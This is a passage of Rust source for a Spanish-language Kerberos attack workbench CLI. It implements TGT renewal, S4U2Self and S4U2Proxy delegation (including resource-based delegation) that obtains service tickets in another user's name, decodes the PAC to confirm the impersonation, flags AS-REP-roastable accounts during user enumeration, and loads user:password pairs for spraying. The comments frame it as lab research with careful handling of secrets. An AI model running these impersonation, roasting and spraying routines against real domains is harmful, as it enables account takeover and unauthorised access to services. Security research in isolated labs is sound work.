                "falta --user/--realm (o usa --ccache para renovar un TGT persistido)".to_string()
            })?;
            let realm = realm.ok_or_else(|| {
                "falta --realm (o usa --ccache para renovar un TGT persistido)".to_string()
            })?;
            let password = resolve_password(password.map(Zeroizing::new), password_stdin)?;
            let salt = match salt {
                Some(s) => s,
                None => learn_salt(&c, &user, &realm)?,
            };
            let key = key_from_credentials(&user, &realm, &salt, &password, None, None)?;
            // Acotado antes del cast a i64: saturating_mul en u64 aún puede
            // producir u64::MAX y "as i64" lo volvería negativo (till en el
            // pasado, el KDC lo rechazaría con un mensaje incomprensible).
            let till = charon_asn1::KrbTime::now()
                .plus_secs(renew_hours.saturating_mul(3_600).min(i64::MAX as u64) as i64);
            let tgt = charon_client::request_tgt_renewable(&c, &user, &realm, &key, &[etype_mod::AES256_CTS_HMAC_SHA1_96], till)
                .map_err(|e| format!("no se pudo obtener el TGT renovable: {e}"))?;
            if tgt.flags & charon_krb5::ticket_flags::RENEWABLE == 0 {
                return fail(
                    "el KDC no concedió el flag RENEWABLE (revisa max_renewable_life del KDC)".into(),
                );
            }
            println!(
                "{} TGT renovable {} → caduca {}, renovable hasta {}",
                "renew:".bold(),
                format!("{user}@{realm}").cyan(),
                tgt.endtime.to_string().yellow(),
                tgt.renew_till.map(|t| t.to_string()).unwrap_or_default()
            );
            let renewed = charon_client::renew_tgt(&c, &tgt, till)
                .map_err(|e| format!("renovación rechazada por el KDC: {e}"))?;
            if json {
                println!(
                    "{}",
                    serde_json::json!({
                        "command": "renew",
                        "mode": "credentials",
                        "cname": format!("{user}@{realm}"),
                        "sname": renewed.ticket.sname.flat(),
                        "session_etype": renewed.session_key.keytype,
                        "authtime": renewed.authtime.to_string(),
                        "endtime": renewed.endtime.to_string(),
                        "renew_till": renewed.renew_till.map(|t| t.to_string()),
                    })
                );
                return Ok(());
            }
            println!(
                "{} renovado → caduca {} (authtime conservada: {}, nueva clave de sesión etype {})",
                "  ↳".green(),
                renewed.endtime.to_string().yellow(),
                renewed.authtime,
                renewed.session_key.keytype
            );
            if trace {
                // El enc-part del TGS-REP va con la clave de sesión del TGT
                // ORIGINAL (usage 8): eso es lo que el trace necesita.
                let sess = KerberosKey::from_raw(tgt.session_key.keytype, &tgt.session_key.keyvalue)
                    .map_err(|e| e.to_string())?;
                let node = charon_trace::trace_kdc_rep(&renewed.raw_reply, Some(&sess)).map_err(|e| e.to_string())?;
                println!("\n{}", charon_trace::render_text(&node));
            }
            Ok(())
        }

        Command::Decode { file, password, password_stdin, nt_hash, realm, user, usage, json } => {
            let bytes = std::fs::read(&file).map_err(|e| format!("no pude leer {file}: {e}"))?;
            let password = if password_stdin { Some(resolve_password(None, true)?) } else { password.map(Zeroizing::new) };
            let key = if let Some(h) = &nt_hash {
                let b = decode_hex(h)?;
                Some(KerberosKey::from_raw(etype_mod::RC4_HMAC, &b).map_err(|e| e.to_string())?)
            } else {
                match (&password, &user) {
                    (Some(p), u) => {
                        let salt = format!("{realm}{}", u.as_str());
                        Some(
                            KerberosKey::from_password(p, &salt, etype_mod::AES256_CTS_HMAC_SHA1_96)
                                .map_err(|e| e.to_string())?,
                        )
                    }
                    _ => None,
                }
            };
            let mut node = charon_trace::trace_message(&bytes).map_err(|e| e.to_string())?;
            // Si hay clave y el mensaje es AS-REP/TGS-REP, descifra el enc-part.
            if key.is_some() && (node.name == "AS-REP" || node.name == "TGS-REP") {
                node = charon_trace::trace_kdc_rep(&bytes, key.as_ref()).map_err(|e| e.to_string())?;
            }
            let _ = usage;
            if json {
                println!("{}", serde_json::to_string_pretty(&node).map_err(|e| e.to_string())?);
            } else {
                println!("{}", charon_trace::render_text(&node));
            }
            Ok(())
        }

        Command::S4u2self { user, password, password_stdin, keytab, salt, impersonate, realm, dc, port, json } => {
            let c = conn(&dc, port);
            // Fuente de clave exclusiva (mismo criterio que `as`): keytab
            // o contraseña. El salt solo interviene en el camino de
            // contraseña; con keytab la clave ya trae su salt cocido.
            if keytab.is_some() && (password.is_some() || password_stdin || salt.is_some()) {
                return fail(
                    "--keytab es incompatible con --password/--password-stdin/--salt: \
                     la clave del servicio sale del fichero (el salt ya está cocido en ella)"
                        .into(),
                );
            }
            if keytab.is_none() && password.is_none() && !password_stdin {
                return fail(
                    "falta la fuente de clave del servicio: --keytab o --password/--password-stdin".into(),
                );
            }
            let keys = match &keytab {
                Some(p) => keys_from_keytab(p, &user, &realm)?,
                None => Vec::new(),
            };
            let key_source: String;
            let key: KerberosKey;
            let password_held: Option<Zeroizing<String>>;
            if let Some(kt_path) = &keytab {
                let (k, kvno, enctype) = pick_keytab_key(&keys, &user)?;
                key = k;
                key_source =
                    format!("keytab {kt_path} (kvno {kvno}, {})", etype_name(enctype));
                password_held = None;
            } else {
                let pw = resolve_password(password.map(Zeroizing::new), password_stdin)?;
                let salt = match salt {
                    Some(s) => s,
                    None => learn_salt(&c, &user, &realm)?,
                };
                key = key_from_credentials(&user, &realm, &salt, &pw, None, None)?;
                key_source = "contraseña".to_string();
                password_held = Some(pw);
            }
            // El etype de la petición se adapta a la clave: con clave RC4 se
            // pide también 18 (MIT 1.21 exige etype de sesión no deprecado).
            let req_etypes = if key.etype() == etype_mod::RC4_HMAC {
                vec![etype_mod::RC4_HMAC, etype_mod::AES256_CTS_HMAC_SHA1_96]
            } else {
                vec![key.etype()]
            };
            let tgt = charon_client::request_tgt(&c, &user, &realm, &key, &req_etypes, 0)
                .map_err(|e| format!("no se pudo obtener el TGT: {e}"))?;
            let st = charon_client::s4u2self(&c, &tgt, &user, &impersonate, &realm)
                .map_err(|e| format!("S4U2Self rechazado: {e}"))?;
            // El ticket va cifrado con la clave larga del servicio: al
            // descifrarlo, el PAC muestra la identidad suplantada.
            // El KDC ELIGE el etype del ticket: con cuentas que tienen RC4
            // puede emitirlo en 23 aunque el analista haya derivado AES256
            // (lección del lab: jdoe con arcfour restaurado → ticket S4U en
            // RC4). La clave de descifrado se elige según el etype REAL del
            // ticket: en el camino keytab se BUSCA la entrada de ese etype
            // (ktadd exporta todas las que la cuenta tiene); con contraseña
            // se deriva la RC4 si hace falta, como hacen impacket/Rubeus.
            let pac_key: KerberosKey = if st.ticket.enc_part.etype == key.etype() {
                key
            } else if let Some(entry) = keys.iter().find(|k| k.2 == st.ticket.enc_part.etype) {
                entry.0.clone()
            } else if st.ticket.enc_part.etype == etype_mod::RC4_HMAC && keytab.is_none() {
                // Camino contraseña: la RC4 no depende del salt (MD4 de la
                // contraseña), así que se deriva directa de la retenida.
                KerberosKey::from_password(
                    password_held.as_deref().ok_or("sin contraseña retenida para derivar RC4")?,
                    "",
                    etype_mod::RC4_HMAC,
                )
                .map_err(|e| format!("no pude derivar la clave RC4 del servicio: {e}"))?
            } else {
                let have = if keys.is_empty() {
                    "modo contraseña".to_string()
                } else {
                    keys.iter().map(|k| etype_name(k.2)).collect::<Vec<_>>().join(", ")
                };
                return fail(format!(
                    "el ticket S4U llegó en {} pero no hay clave de ese etype para {user} \
                     (disponible: {have}). Vuelve a exportar con `ktadd -norandkey {user}` \
                     para traer todas las enctypes de la cuenta.",
                    etype_name(st.ticket.enc_part.etype)
                ));
            };
            let (pac_client, pac_error) = match charon_krb5::pac::extract_pac(&st.ticket, &pac_key) {
                Ok(pac) => match pac.client_info() {
                    Some((_, name)) => (Some(name), None),
                    None => (
                        None,
                        Some(format!(
                            "PAC sin CLIENT INFO (buffers: {:?})",
                            pac.buffers.iter().map(|b| b.buffer_type).collect::<Vec<_>>()
                        )),
                    ),
                },
                Err(e) => (None, Some(e.to_string())),
            };
            let forwardable = st.flags & charon_krb5::ticket_flags::FORWARDABLE != 0;
            if json {
                println!(
                    "{}",
                    serde_json::json!({
                        "command": "s4u2self",
                        "service": format!("{user}@{realm}"),
                        "impersonated": impersonate,
                        "ticket_sname": st.ticket.sname.flat(),
                        "ticket_etype": st.ticket.enc_part.etype,
                        "ticket_etype_name": etype_name(st.ticket.enc_part.etype),
                        "forwardable": forwardable,
                        "pac_client": pac_client,
                        "pac_error": pac_error,
                        "key_source": key_source,
                    })
                );
                return Ok(());
            }
            println!(
                "{} ticket para {} en nombre de {} (etype {})",
                "s4u2self:".bold(),
                st.ticket.sname.flat().cyan(),
                impersonate.yellow(),
                st.ticket.enc_part.etype
            );
            println!("  {} clave del servicio desde {}", "·".dimmed(), key_source.dimmed());
            match (pac_client, pac_error) {
                (Some(name), _) => println!("  PAC CLIENT INFO: {}", name.green()),
                (None, Some(e)) => println!("  PAC: {e}"),
                (None, None) => {}
            }
            Ok(())
        }

        Command::S4u2proxy { user, password, password_stdin, keytab, salt, impersonate, to, to_password, to_keytab, rbcd, realm, dc, port, json } => {
            let c = conn(&dc, port);
            // Fuente de clave exclusiva para el servicio que DELEGA (mismo
            // criterio que `as` y `s4u2self`). --to-password es indepen-
            // diente: es la clave del servicio DESTINO, solo para demostrar
            // el PAC del ticket final.
            if keytab.is_some() && (password.is_some() || password_stdin || salt.is_some()) {
                return fail(
                    "--keytab es incompatible con --password/--password-stdin/--salt: \
                     la clave del servicio que delega sale del fichero"
                        .into(),
                );
            }
            if keytab.is_none() && password.is_none() && !password_stdin {
                return fail(format!(
                    "falta la fuente de clave de {user}: --keytab o --password/--password-stdin"
                ));
            }
            let keys = match &keytab {
                Some(p) => keys_from_keytab(p, &user, &realm)?,
                None => Vec::new(),
            };
            let key_source: String;
            let key: KerberosKey;
            if let Some(kt_path) = &keytab {
                let (k, kvno, enctype) = pick_keytab_key(&keys, &user)?;
                key = k;
                key_source =
                    format!("keytab {kt_path} (kvno {kvno}, {})", etype_name(enctype));
            } else {
                let pw = resolve_password(password.map(Zeroizing::new), password_stdin)?;
                let salt = match salt {
                    Some(s) => s,
                    None => learn_salt(&c, &user, &realm)?,
                };
                key = key_from_credentials(&user, &realm, &salt, &pw, None, None)?;
                key_source = "contraseña".to_string();
            }
            // 1) TGT del servicio que delega. Lección del lab verificada
            // contra kdc_util.c de MIT 1.21 (get_ticket_flags, líneas
            // 843-844): MIT recorta FORWARDABLE del ticket emitido si el
            // TGT cabecera no lo lleva — las opciones del TGS-REQ no
            // pueden AÑADIR el flag, solo heredarse. Por eso el TGT del
            // servicio se pide FORWARDABLE (lo que kinit hace por
            // defecto con forwardable=true). El etype se adapta a la
            // clave (con RC4, pedir también 18: lección de passthekey).
            let req_etypes = if key.etype() == etype_mod::RC4_HMAC {
                vec![etype_mod::RC4_HMAC, etype_mod::AES256_CTS_HMAC_SHA1_96]
            } else {
                vec![key.etype()]
            };
            let tgt = charon_client::request_tgt(
                &c,
                &user,
                &realm,
                &key,
                &req_etypes,
                charon_krb5::kdc_options::FORWARDABLE,
            )
            .map_err(|e| format!("no se pudo obtener el TGT de {user}: {e}"))?;
            // 2) Evidence ticket: S4U2Self del usuario suplantado. MIT solo
            // lo emite FORWARDABLE si el servicio tiene ok_to_auth_as_delegate.
            let evidence = charon_client::s4u2self(&c, &tgt, &user, &impersonate, &realm)
                .map_err(|e| format!("S4U2Self rechazado: {e}"))?;
            let forwardable = evidence.flags & charon_krb5::ticket_flags::FORWARDABLE != 0;
            if !json {
                println!(
                    "{} evidence ticket {} → {} (etype {}, forwardable: {})",
                    "s4u2self:".bold(),
                    evidence.ticket.sname.flat().cyan(),
                    impersonate.yellow(),
                    evidence.ticket.enc_part.etype,
                    if forwardable {
                        "sí".green().to_string()
                    } else {
                        "NO".red().to_string()
                    }
                );
            }
            if !forwardable {
                return fail(format!(
                    "el evidence ticket NO es forwardable: el KDC no concedió la delegación. \
                     ¿Tiene {user} el atributo ok_to_auth_as_delegate? (scripts/lab_setup_delegation.sh \
                     o el KDC test-KDB del lab, lab/setup-test-kdb.sh)"
                ));
            }
            // 3) S4U2Proxy: ticket del usuario hacia el servicio destino.
            // Con --rbcd el cable lleva PA-PAC-OPTIONS con el bit RBCD
            // (el cable del cliente de referencia, MIT s4u_creds.c 1013)
            // y la autorización la decide la política del RECURSO.
            let proxy_result = if rbcd {
                charon_client::s4u2proxy_rbcd(
                    &c,
                    &tgt,
                    &evidence.ticket,
                    &to,
                    &impersonate,
                    &realm,
                    &[etype_mod::AES256_CTS_HMAC_SHA1_96, etype_mod::RC4_HMAC],
                )
            } else {
                charon_client::s4u2proxy(
                    &c,
                    &tgt,
                    &evidence.ticket,
                    &to,
                    &impersonate,
                    &realm,
                    &[etype_mod::AES256_CTS_HMAC_SHA1_96, etype_mod::RC4_HMAC],
                )
            };
            let final_st = match proxy_result {
                Ok(st) => st,
                Err(charon_client::ClientError::Krb5(charon_krb5::Krb5Error::BadReply(msg)))
                    if msg.contains("KDC_ERR_BADOPTION") =>
                {
                    if rbcd {
                        return fail(format!(
                            "S4U2Proxy RBCD rechazado con KDC_ERR_BADOPTION: el recurso {to} \
                             no autoriza a {user} a delegar en su nombre (política \
                             resource-based: en AD, msDS-AllowedToActOnBehalfOfOtherIdentity \
                             del destino; en el lab test-KDB, la tabla rbcd con nombres \
                             CON reino). Detalle: {msg}"
                        ));
                    }
                    return fail(format!(
                        "S4U2Proxy rechazado con KDC_ERR_BADOPTION. Diagnóstico: \
                         MIT con backend db2 NO puede autorizar ninguna delegación \
                         (la política vive en el KDB: solo LDAP o el módulo test de \
                         MIT implementan allowed_to_delegate — ver informe de ronda y \
                         docs/threat-model.md; el lab trae un segundo KDC test-KDB con \
                         tabla de delegación en lab/setup-test-kdb.sh; con política \
                         resource-based usa --rbcd). Detalle: {msg}"
                    ));
                }
                Err(e) => return Err(format!("S4U2Proxy rechazado: {e}")),
            };
            // 4) Prueba de la delegación: el ticket final va cifrado con la
            // clave larga del servicio DESTINO. Descifrándolo con ella, el
            // PAC muestra al usuario suplantado — sin que el usuario haya
            // participado. La clave del destino sale de --to-keytab (la
            // única vía con KDBs sin contraseñas: cuentas de máquina,
            // LDAP o el módulo test del lab) o se deriva de --to-password.
            // En ambos casos la clave se elige por el etype REAL del ticket.
            if to_password.is_some() && to_keytab.is_some() {
                return fail(
                    "--to-keytab es incompatible con --to-password: una sola fuente \
                     para la clave del servicio destino"
                        .into(),
                );
            }
            let to_password = to_password.map(Zeroizing::new);
            let (pac_client, pac_error) = if let Some(kt_path) = &to_keytab {
                let dest_keys = keys_from_keytab(kt_path, &to, &realm)?;
                match dest_keys.iter().find(|k| k.2 == final_st.ticket.enc_part.etype) {
                    Some(entry) => match charon_krb5::pac::extract_pac(&final_st.ticket, &entry.0) {
                        Ok(pac) => match pac.client_info() {
                            Some((_, name)) => (Some(name), None),
                            None => (
                                None,
                                Some(format!(
                                    "PAC sin CLIENT INFO (buffers: {:?})",
                                    pac.buffers.iter().map(|b| b.buffer_type).collect::<Vec<_>>()
                                )),
                            ),
                        },
                        Err(e) => (None, Some(e.to_string())),
                    },
                    None => (
                        None,
                        Some(format!(
                            "el keytab de {to} no trae clave en {} (entradas: {}). \
                             Exporta todas las enctypes con ktadd -norandkey",
                            etype_name(final_st.ticket.enc_part.etype),
                            dest_keys.iter().map(|k| etype_name(k.2)).collect::<Vec<_>>().join(", ")
                        )),
                    ),
                }
            } else if let Some(dbpass) = &to_password {
                let db_salt = learn_salt(&c, &to, &realm)?;
                let db_key = if final_st.ticket.enc_part.etype == etype_mod::RC4_HMAC {
                    KerberosKey::from_password(dbpass, &db_salt, etype_mod::RC4_HMAC)
                } else {
                    KerberosKey::from_password(dbpass, &db_salt, etype_mod::AES256_CTS_HMAC_SHA1_96)
                }
                .map_err(|e| format!("no pude derivar la clave de {to}: {e}"))?;
                match charon_krb5::pac::extract_pac(&final_st.ticket, &db_key) {
                    Ok(pac) => match pac.client_info() {
                        Some((_, name)) => (Some(name), None),
                        None => (
                            None,
                            Some(format!(
                                "PAC sin CLIENT INFO (buffers: {:?})",
                                pac.buffers.iter().map(|b| b.buffer_type).collect::<Vec<_>>()
                            )),
                        ),
                    },
                    Err(e) => (None, Some(e.to_string())),
                }
            } else {
                (None, None)
            };
            if json {
                println!(
                    "{}",
                    serde_json::json!({
                        "command": "s4u2proxy",
                        "service": format!("{user}@{realm}"),
                        "impersonated": impersonate,
                        "target": to,
                        "evidence_forwardable": forwardable,
                        "ticket_cname": final_st.cname,
                        "ticket_sname": final_st.ticket.sname.flat(),
                        "ticket_etype": final_st.ticket.enc_part.etype,
                        "ticket_etype_name": etype_name(final_st.ticket.enc_part.etype),
                        "rbcd": rbcd,
                        "pac_client": pac_client,
                        "pac_error": pac_error,
                        "key_source": key_source,
                    })
                );
                return Ok(());
            }
            println!(
                "{} ticket delegado: cliente {}, destino {} (etype {}){}",
                "s4u2proxy:".bold(),
                final_st.cname.green(),
                final_st.ticket.sname.flat().cyan(),
                final_st.ticket.enc_part.etype,
                if rbcd { " [RBCD]".yellow().to_string() } else { String::new() }
            );
            match (pac_client, pac_error) {
                (Some(name), _) => println!(
                    "  PAC CLIENT INFO del ticket delegado: {} {}",
                    name.green(),
                    format!("(delegado por {user}, no por {impersonate})").dimmed()
                ),
                (None, Some(e)) => println!("  PAC: {e}"),
                (None, None) => {
                    println!(
                        "  (sin --to-password no se descifra el ticket final; añádela para ver el PAC del suplantado)"
                    );
                }
            }
            Ok(())
        }

        Command::Matrix { realm, user, password, aes_only_user, no_preauth_user, spn_with_aes, spn_rc4_only, ghost_user, profile, dc, port, out } => {
            let c = conn(&dc, port);
            // El salt se aprende del propio KDC (el flujo canónico del proyecto).
            let salt = learn_salt(&c, &user, &realm)?;
            let user_key = key_from_credentials(&user, &realm, &salt, &password, None, None)?;
            let ctx = charon_matrix::ProbeCtx {
                conn: c,
                realm: realm.clone(),
                user: user.clone(),
                user_key,
                aes_only_user,
                no_preauth_user,
                spn_with_aes,
                spn_rc4_only,
                ghost_user,
            };
            let dataset = charon_matrix::run_battery(&ctx, &profile);
            let text = serde_json::to_string_pretty(&dataset).map_err(|e| e.to_string())?;
            match out {
                Some(path) => {
                    std::fs::write(&path, &text).map_err(|e| format!("no pude escribir {path}: {e}"))?;
                    println!("{} dataset escrito en {}", "matrix:".bold(), path.cyan());
                    println!("  {} sondas contra {}", dataset.rows.len(), format!("{dc}:{port}").bold());
                }
                None => println!("{text}"),
            }
            Ok(())
        }

        Command::Keytab { file, json } => {
            warn_lax_secret_file_perms(&file, "keytab");
            let bytes = std::fs::read(&file).map_err(|e| format!("no pude leer {file}: {e}"))?;
            let entries = charon_krb5::keytab::parse(&bytes)
                .map_err(|e| format!("keytab {file}: {e}"))?;
            if json {
                let items: Vec<serde_json::Value> = entries
                    .iter()
                    .map(|e| {
                        serde_json::json!({
                            "principal": e.qualified(),
                            "realm": e.realm,
                            "kvno": e.kvno,
                            "enctype": e.enctype,
                            "enctype_name": etype_name(e.enctype),
                            "timestamp": e.timestamp,
                        })
                    })
                    .collect();
                println!("{}", serde_json::to_string_pretty(&items).map_err(|e| e.to_string())?);
            } else {
                let version_note = if bytes.len() >= 2 && bytes[0] == 0x05 && bytes[1] == 0x01 {
                    "v1 (compatibilidad DCE)"
                } else {
                    "v2 (estándar de MIT)"
                };
                println!(
                    "{} {} (formato {} de MIT, {} entradas)",
                    "keytab:".bold(),
                    file.cyan(),
                    version_note,
                    entries.len()
                );
                for e in &entries {
                    println!(
                        "  {}  kvno {:<4} {:<24} {}",
                        e.qualified().cyan(),
                        e.kvno,
                        etype_name(e.enctype).yellow(),
                        charon_asn1::KrbTime::from_unix(e.timestamp as i64).to_string().dimmed()
                    );
                }
                println!(
                    "\n{}",
                    "(las claves no se imprimen: el keytab es material sensible)".dimmed()
                );
            }
            Ok(())
        }

        Command::Ccache { file, json } => {
            warn_lax_secret_file_perms(&file, "ccache");
            let bytes = std::fs::read(&file).map_err(|e| format!("no pude leer {file}: {e}"))?;
            let info = ccache_info(&bytes).map_err(|e| format!("ccache {file}: {e}"))?;
            if json {
                println!(
                    "{}",
                    serde_json::to_string_pretty(&info.to_json(&file)).map_err(|e| e.to_string())?
                );
            } else {
                print_ccache(&info, &file);
            }
            Ok(())
        }
    }
}

// ---------- helpers de CLI ----------

fn print_enum(user: &str, status: &charon_attacks::UserStatus) {
    use charon_attacks::UserStatus::*;
    match status {
        ExistsWithPreauth { salts } => {
            println!("{} {} existe (requiere preauth)", "✓".green().bold(), user.cyan());
            for (et, salt) in salts {
                println!("    salt (etype {et}): {}", salt.yellow());
            }
        }
        ExistsWithoutPreauth => {
            println!("{} {} existe y NO requiere preauth → AS-REP roasteable", "!".yellow().bold(), user.cyan());
        }
        Unknown => {
            println!("{} {} no existe", "✗".red().bold(), user.dimmed());
        }
        PreauthFailed => println!("{} {} existe (preauth fallido)", "✓".green().bold(), user.cyan()),
        Other(code) => println!("{} {} → código {} inesperado (apúntalo: fingerprint del KDC)", "?".yellow(), user, code),
    }
}

// ---------- inspección de ccache (comando `ccache`) ----------

/// Resumen SENSIBLE-FREE de una credencial del ccache: de la clave solo
/// se expone el enctype, nunca los bytes (el ccache lleva la clave de
/// sesión en claro por diseño del formato).
#[derive(Debug)]
struct CcacheCredInfo {
    /// Cliente cualificado (`jdoe@LAB.LOCAL`).
    client: String,
    /// Servidor cualificado (`krbtgt/LAB.LOCAL@LAB.LOCAL`).
    server: String,
    is_config_entry: bool,
    /// `krbtgt/...` — TGT del propio reino o cross-realm.
    is_tgt: bool,
    session_etype: i32,
    /// kvno y sname del ticket DER (si parsea; una entrada de
    /// configuración no lleva un ticket real).
    ticket_kvno: Option<u32>,
    ticket_sname: Option<String>,
    flags: Vec<&'static str>,
    authtime: u32,
    starttime: Option<u32>,
    endtime: u32,
    renew_till: Option<u32>,
    is_skey: bool,
    expired: bool,
    /// Segundos hasta `endtime` (negativo si caducó).
    seconds_left: i64,
}

/// Resumen completo de un ccache parseado (sin material sensible).
#[derive(Debug)]
struct CcacheFileInfo {
    version: u8,
    default_principal: String,
    credentials: Vec<CcacheCredInfo>,
}

fn unix_now() -> i64 {
    std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .map(|d| d.as_secs() as i64)
        .unwrap_or(0)
}

/// Parsea un ccache v4 y resume su contenido. La validez se calcula contra
/// el reloj actual (igual que hace `klist` al mostrar las fechas: si el
/// reloj del analista está torcido, el estado también sale torcido — es
/// inherente a una herramienta offline).
fn ccache_info(bytes: &[u8]) -> Result<CcacheFileInfo, String> {
    let file = charon_krb5::ccache::CcacheFile::parse(bytes).map_err(|e| e.to_string())?;
    let now = unix_now();
    let mut credentials = Vec::new();
    for cred in &file.credentials {
        // kvno y sname salen del ticket DER. Un ticket que no parsea NO
        // aborta la inspección (reporta el resto; es un workbench, no un
        // validador estricto — klist hace lo mismo).
        let (ticket_kvno, ticket_sname) = if cred.is_config_entry() {
            (None, None)
        } else {
            match charon_krb5::ccache::ticket_of(cred) {
                Ok(t) => (t.enc_part.kvno, Some(t.sname.name_string.join("/"))),
                Err(_) => (None, None),
            }
        };
        let seconds_left = i64::from(cred.endtime) - now;
        credentials.push(CcacheCredInfo {
            client: format!("{}@{}", cred.client.flat(), cred.client.realm),
            server: format!("{}@{}", cred.server.flat(), cred.server.realm),
            is_config_entry: cred.is_config_entry(),
            is_tgt: cred.server.components.first().is_some_and(|c| c == "krbtgt"),
            session_etype: cred.key.keytype,
            ticket_kvno,
            ticket_sname,
            flags: ticket_flag_names(cred.flags),
            authtime: cred.authtime,
            starttime: cred.starttime,
            endtime: cred.endtime,
            renew_till: cred.renew_till,
            is_skey: cred.is_skey,
            expired: seconds_left <= 0,
            seconds_left,
        });
    }
    Ok(CcacheFileInfo {
        version: file.version,
        default_principal: format!(
            "{}@{}",
            file.default_principal.flat(),
            file.default_principal.realm
        ),
        credentials,
    })
}

impl CcacheFileInfo {
    /// Contrato JSON (Ronda V): un objeto por comando, snake_case, sin
    /// ANSI, tiempos Kerberos y estados explícitos para consumir con jq.
    /// Las entradas de configuración de MIT no llevan tiempos ni ticket
    /// reales (campos a 0): se exponen como null, no como fechas falsas.
    fn to_json(&self, path: &str) -> serde_json::Value {
        let iso = |secs: u32| charon_asn1::KrbTime::from_unix(i64::from(secs)).to_string();
        serde_json::json!({
            "file": path,
            "format_version": self.version,
            "default_principal": self.default_principal,
            "credentials": self.credentials.iter().map(|c| {
                let real = !c.is_config_entry;
                serde_json::json!({
                    "client": c.client,
                    "server": c.server,
                    "is_tgt": c.is_tgt,
                    "is_config_entry": c.is_config_entry,
                    "session_etype": real.then_some(c.session_etype),
                    "session_etype_name": real.then(|| etype_name(c.session_etype)),
                    "ticket_kvno": if real { c.ticket_kvno } else { None::<u32> },
                    "ticket_sname": if real { c.ticket_sname.clone() } else { None::<String> },
                    "flags": c.flags,
                    "is_skey": c.is_skey,
                    "authtime": real.then(|| iso(c.authtime)),
                    "starttime": c.starttime.filter(|_| real).map(iso),
                    "endtime": real.then(|| iso(c.endtime)),
                    "renew_till": c.renew_till.filter(|_| real).map(iso),
                    "expired": if real { c.expired } else { false },
                    "seconds_left": real.then_some(c.seconds_left),
                })
            }).collect::<Vec<_>>(),
        })
    }
}

/// Salida humana: una línea de cabecera, un bloque por credencial y el
/// estado de vigencia — el mismo papel que `klist -c` para un ccache
/// escrito por `kinit`/Charon, en el idioma y el estilo del workbench.
fn print_ccache(info: &CcacheFileInfo, file: &str) {
    println!(
        "{} {} (formato FILE v{} de MIT, {} credencial(es))",
        "ccache:".bold(),
        file.cyan(),
        info.version,
        info.credentials.len()
    );
    println!(
        "  principal por defecto: {}",
        info.default_principal.green()
    );
    for (i, c) in info.credentials.iter().enumerate() {
        let idx_raw = format!("[{i}]");
        let idx = idx_raw.dimmed();
        if c.is_config_entry {
            println!(
                "  {idx} entrada de configuración de MIT: {} (no es un ticket)",
                c.server.dimmed()
            );
            continue;
        }
        let kind = if c.is_tgt { "TGT" } else { "ticket de servicio" };
        println!(
            "  {idx} {} de {} → {} ({})",
            kind,
            c.client.cyan(),
            c.server.yellow(),
            etype_name(c.session_etype)
        );
        if let (Some(k), Some(s)) = (c.ticket_kvno, &c.ticket_sname) {
            println!("        ticket: sname {s}, kvno {k}");
        }
        let mut bits: Vec<&str> = c.flags.clone();
        if c.is_skey {
            bits.push("skey");
        }
        if !bits.is_empty() {
            println!("        flags: {}", bits.join(", "));
        }
        let et = charon_asn1::KrbTime::from_unix(i64::from(c.endtime)).to_string();
        let at = charon_asn1::KrbTime::from_unix(i64::from(c.authtime)).to_string();
        let rt = c
            .renew_till
            .map(|t| format!("  renew_till {}", charon_asn1::KrbTime::from_unix(i64::from(t))))
            .unwrap_or_default();
        println!("        authtime {at}  endtime {et}{rt}");
        let estado = if c.expired {
            format!(
                "CADUCADA hace {} min",
                (-c.seconds_left / 60).max(1)
            )
            .red()
            .bold()
            .to_string()
        } else {
            format!(
                "válida {} h {} min más",
                c.seconds_left / 3600,
                (c.seconds_left % 3600) / 60
            )
            .green()
            .to_string()
        };
        println!("        estado: {estado}");
    }
    println!(
        "\n{}",
        "(la clave de sesión no se imprime: el ccache lleva material sensible)".dimmed()
    );
}

/// "@fichero" carga una lista; si no, toma los valores tal cual.
fn resolve_users(input: &[String]) -> Result<Vec<String>, String> {
    let mut out = Vec::new();
    for item in input {
        if let Some(path) = item.strip_prefix('@') {
            let content = std::fs::read_to_string(path).map_err(|e| format!("no pude leer {path}: {e}"))?;
            for line in content.lines() {
                let u = line.trim();
                if !u.is_empty() && !u.starts_with('#') {
                    out.push(u.to_string());
                }
            }
        } else {
            out.push(item.clone());
        }
    }
    Ok(out)
}

/// Pares `usuario:contraseña` del spray. Envuelve la lista para hacer
/// `zeroize` de las contraseñas al soltarla (Drop): el patrón ya existía
/// para las claves de `kcrypto` (Ronda 1) y la Ronda 2 lo dejó pendiente
/// para los pares — el fichero de pares lleva secretos en claro, y no
/// deben quedar copias en memoria liberada.
struct SprayPairs(Vec<(String, String)>);

impl std::ops::Deref for SprayPairs {
    type Target = Vec<(String, String)>;
    fn deref(&self) -> &Self::Target {
        &self.0
    }
}

impl Drop for SprayPairs {
    fn drop(&mut self) {
        use zeroize::Zeroize;
        for (_, pw) in self.0.iter_mut() {
            pw.zeroize();
        }
    }
}

/// Aciertos del spray (`usuario<TAB>contraseña`): son secretos EN CLARO
/// vivos en memoria durante todo el comando — y cada `format!` del bucle
/// es una copia más que sobrevive al scope del par que la originó. El
/// contenedor ceroiza cada línea al soltar (la copia intencional que
/// queda es la del fichero de `--output`, que el analista pide y debe
/// proteger él). Cierre del ciclo de vida que quedó pendiente en la
/// Ronda 2 junto con el de SprayPairs.
#[derive(Default)]
struct Hits(Vec<String>);

impl std::ops::Deref for Hits {
    type Target = Vec<String>;
    fn deref(&self) -> &Self::Target {
        &self.0
    }
}

impl std::ops::DerefMut for Hits {
    fn deref_mut(&mut self) -> &mut Self::Target {
        &mut self.0
    }
}

impl Drop for Hits {
    fn drop(&mut self) {
        use zeroize::Zeroize;
        for line in self.0.iter_mut() {
            line.zeroize();
        }
    }
}

/// Carga un fichero de pares `usuario:contraseña` (uno por línea) para
/// el spray por pares. Se acepta ruta directa o "@ruta" (misma forma
/// que --users). Reglas: '#' comenta la línea; la contraseña puede
/// contener ':' (se parte en el primero); los espacios de los extremos
/// de la línea y de la contraseña se recortan — es formato de
/// laboratorio: para contraseñas con espacios significativos, usa el
/// modo clásico con --password-stdin. Los errores señalan el número de
/// línea (falla pronto, no a mitad de spray).
fn resolve_pairs(spec: &str) -> Result<Vec<(String, String)>, String> {
    let path = spec.strip_prefix('@').unwrap_or(spec);
    let content = std::fs::read_to_string(path).map_err(|e| format!("no pude leer {path}: {e}"))?;
    let mut out = Vec::new();
    for (n, line) in content.lines().enumerate() {
        let line = line.trim();
        if line.is_empty() || line.starts_with('#') {
            continue;
        }
        let Some((u, pw)) = line.split_once(':') else {
            return Err(format!("línea {}: falta ':' — formato usuario:contraseña", n + 1));
        };
        let u = u.trim();
        let pw = pw.trim();
        if u.is_empty() {
